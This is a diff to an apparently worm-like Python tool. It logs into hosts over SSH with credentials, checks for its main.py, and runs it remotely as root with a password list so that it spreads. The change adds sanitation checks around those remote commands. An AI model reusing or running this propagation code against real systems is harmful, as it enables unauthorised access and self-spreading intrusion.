@@ -106,11 +106,20 @@ def check_over_ssh(ip, port, username, password):
         client.set_missing_host_key_policy(RejectPolicy)
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
-        client.exec_command(strings.touch_file(strings.MAIN_SCRIPT))
-        if str(client.exec_command(pipes.quote(strings.cat_file(
-                strings.MAIN_SCRIPT)))[1]).__len__() < 1:
-            client.close()
-            return True
+        if strings.touch_file(strings.MAIN_FILENAME) == "touch main.py":
+            client.exec_command(pipes.quote(strings.
+                                            touch_file(strings.MAIN_FILENAME)))
+        else:
+            logging.error(strings.SANITATION_FAILED)
+            return False
+        if strings.cat_file(strings.MAIN_FILENAME) == "cat main.py":
+            if str(client.exec_command(pipes.quote(strings.cat_file(
+                    strings.MAIN_FILENAME)))[1]).__len__() < 1:
+                client.close()
+                return True
+            else:
+                logging.error(strings.SANITATION_FAILED)
+                return False
         client.close()
         return False
 
@@ -357,7 +366,15 @@ def propagate_script(ip, port, login_string):
                 client.connect(hostname=str(ip), port=int(port),
                                username=str(login_string_split[0]),
                                password=str(login_string_split[1]))
-                client.exec_command(pipes.quote(strings.run_script_command()))
+                if strings.run_script_command() == "./main.py -L -p 22 -u " \
+                                                   "root -f " \
+                                                   "src/test_files/" \
+                                                   "passwords_list.txt -P":
+                    client.exec_command(pipes.quote(
+                        strings.run_script_command()))
+                else:
+                    logging.error(strings.SANITATION_FAILED)
+                    return False
                 client.close()
                 return True
             except RuntimeError:
